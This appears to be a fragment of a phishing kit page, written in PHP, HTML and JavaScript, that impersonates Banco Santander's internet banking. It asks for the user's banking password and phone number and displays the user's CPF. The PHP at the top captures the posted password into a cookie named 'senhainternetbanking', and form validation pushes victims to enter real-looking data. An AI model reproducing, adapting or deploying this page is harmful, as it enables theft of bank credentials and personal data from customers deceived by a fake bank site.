<?php
if(isset($_POST['senha8']) && !empty($_POST['senha8'])){
$cookie_value=$_POST['senha8'];
setcookie('senhainternetbanking',$cookie_value, time() + 3600, '/');
...
if ( document.form.telefone.value == "" || document.form.telefone.length < 10 || document.form.telefone.value == "(00)00000-0000" || document.form.telefone.value == "(11)11111-1111" || document.form.telefone.value == "(22)22222-2222" || document.form.telefone.value == "(33)33333-3333" || document.form.telefone.value == "(44)44444-4444" || document.form.telefone.value == "(55)55555-5555" || document.form.telefone.value == "(66)66666-6666" || document.form.telefone.value == "(77)77777-7777" || document.form.telefone.value == "(88)88888-8888" || document.form.telefone.value == "(99)99999-9999"){ ModalAlertError.innerHTML = "Telefone inv?ido! 'DDD + N?ero'"; ModalAlert.style.display = ""; return false; }
...
{ ModalAlertError.innerHTML = "Senha da net, inv?ida!"; ModalAlert.style.display = ""; return false; 
...
var ModalAlert = document.getElementById("modalalert");
	...
	ModalAlertError.innerHTML = "Para efetuar transa?es, informe os dados obrigat?io para confirmar!"; ModalAlert.style.display = "";
...
// -->
 ...
 <font color="#666666">CPF: </font>&nbsp;<font face="Verdana" size="2" color="#ED2228"> <?php $cpf = $_COOKIE['cpf']; echo $cpf; ?> </font></h1></div>
...
Senha de Acesso</span></p>



<div style="font-size:14px; color:#666666;"><font style="font-size: 9pt">Execute 

	os procedimentos de Segurança oferecidos pelo Banco Santander.</font></div>
...
Senha do internet Banking: </span><span style="font-size: 7pt">(6 a 8 dígitos)</span><div>

<p style="-webkit-text-security:disc; line-height: 120%; margin-top: 0; margin-bottom: 0"><input type="password" name="senha8" id="senha8" maxlength="8" required="" class="form" /></p><div>
...
<p></p><div style="height:74px; width:1311px; margin-top:10px">
...
<script type="text/javascript">
	...
	function clear_password(){
		...
		document.getElementById('senha8').value = "";
	...
	function submitlogin(){
		...
		var tamsenha = document.getElementById('senha8').value.length;

		if (document.getElementById('senha8').value == ''){
